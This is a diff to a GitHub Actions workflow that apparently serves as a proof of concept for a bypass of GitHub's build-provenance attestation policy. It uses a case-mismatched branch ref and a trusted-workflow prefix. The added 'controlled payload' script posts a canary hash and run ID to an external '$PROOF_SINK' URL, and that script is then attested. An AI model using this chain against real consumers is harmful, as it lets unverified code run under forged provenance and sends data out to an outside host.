@@ -14,16 +14,43 @@ jobs:
   attest:
     runs-on: ubuntu-latest
     steps:
-      - name: Create subject
+      - name: Confirm the source token cannot access the private consumer
         shell: bash
-        run: printf 'GH_ATTEST_POLICY_CANARY_v1\n' > artifact.txt
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          status="$(curl --silent --output /dev/null --write-out '%{http_code}' \
+            -H "Authorization: Bearer $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            https://api.github.com/repos/h1-no01-b-260806/h1-attestation-consumer-09120350)"
+          echo "SOURCE_TOKEN_CONSUMER_STATUS=$status"
+          case "$status" in
+            403|404) ;;
+            *) exit 1 ;;
+          esac
 
-      - name: Attest subject
+      - name: Create controlled payload
+        shell: bash
+        run: |
+          cat > payload.sh <<'PAYLOAD'
+          #!/usr/bin/env bash
+          set -euo pipefail
+          canary_hash="$(sha256sum ACTIONS_CANARY.txt | cut -d ' ' -f1)"
+          curl --fail --silent --show-error -X POST \
+            --data-urlencode "canary_sha256=$canary_hash" \
+            --data-urlencode "consumer_run_id=$GITHUB_RUN_ID" \
+            "$PROOF_SINK"
+          echo "CONTROLLED_PAYLOAD_EXECUTED canary_sha256=$canary_hash consumer_run_id=$GITHUB_RUN_ID"
+          PAYLOAD
+          chmod +x payload.sh
+          sha256sum payload.sh
+
+      - name: Attest payload
         uses: actions/attest-build-provenance@v3
         with:
-          subject-path: artifact.txt
+          subject-path: payload.sh
 
-      - name: Verify exact and mismatched policies
+      - name: Verify policy matrix
         shell: bash
         env:
           GH_TOKEN: ${{ github.token }}
@@ -36,17 +63,15 @@ jobs:
           check_policy() {
             label="$1"
             shift
-            gh attestation verify artifact.txt --repo "$repo" --format json "$@" >"/tmp/$label.json" 2>"/tmp/$label.err"
+            gh attestation verify payload.sh --repo "$repo" --format json "$@" >"/tmp/$label.json" 2>"/tmp/$label.err"
             CHECK_RC=$?
             echo "CASE $label exit=$CHECK_RC"
             if [ "$CHECK_RC" -eq 0 ]; then
-              jq -r '.[0].verificationResult.signature.certificate | "certificate_ref=" + .sourceRepositoryRef, "certificate_san=" + .subjectAlternativeName, "certificate_signer=" + .buildSignerURI' "/tmp/$label.json"
+              jq -r '.[0].verificationResult.signature.certificate | "certificate_ref=" + .sourceRepositoryRef, "certificate_san=" + .subjectAlternativeName' "/tmp/$label.json"
             else
               tail -n 2 "/tmp/$label.err"
             fi
           }
-
-          gh --version | head -n 1
 
           for retry in 1 2 3 4 5 6; do
             check_policy baseline --source-ref refs/heads/Main --signer-workflow "$actual"
@@ -54,12 +79,6 @@ jobs:
             [ "$baseline_rc" -eq 0 ] && break
             sleep 5
           done
-
-          check_policy case_ref_only --source-ref refs/heads/main --signer-workflow "$actual"
-          case_ref_rc=$CHECK_RC
-
-          check_policy workflow_prefix_only --source-ref refs/heads/Main --signer-workflow "$trusted"
-          workflow_prefix_rc=$CHECK_RC
 
           check_policy combined_bypass --source-ref refs/heads/main --signer-workflow "$trusted"
           combined_rc=$CHECK_RC
@@ -70,16 +89,8 @@ jobs:
           check_policy unrelated_workflow --source-ref refs/heads/Main --signer-workflow "$repo/.github/workflows/unrelated.yml"
           unrelated_workflow_rc=$CHECK_RC
 
-          echo "SUMMARY baseline=$baseline_rc case_ref=$case_ref_rc workflow_prefix=$workflow_prefix_rc combined=$combined_rc unrelated_ref=$unrelated_ref_rc unrelated_workflow=$unrelated_workflow_rc"
-
-          if [ "$baseline_rc" -eq 0 ] &&
-             [ "$case_ref_rc" -eq 0 ] &&
-             [ "$workflow_prefix_rc" -eq 0 ] &&
-             [ "$combined_rc" -eq 0 ] &&
-             [ "$unrelated_ref_rc" -ne 0 ] &&
-             [ "$unrelated_workflow_rc" -ne 0 ]; then
-            echo "ATTESTATION_POLICY_BYPASS_CONFIRMED"
-          else
-            echo "ATTESTATION_POLICY_MATRIX_UNEXPECTED"
-            exit 1
-          fi
+          echo "SUMMARY baseline=$baseline_rc combined=$combined_rc unrelated_ref=$unrelated_ref_rc unrelated_workflow=$unrelated_workflow_rc"
+          [ "$baseline_rc" -eq 0 ] &&
+          [ "$combined_rc" -eq 0 ] &&
+          [ "$unrelated_ref_rc" -ne 0 ] &&
+          [ "$unrelated_workflow_rc" -ne 0 ]
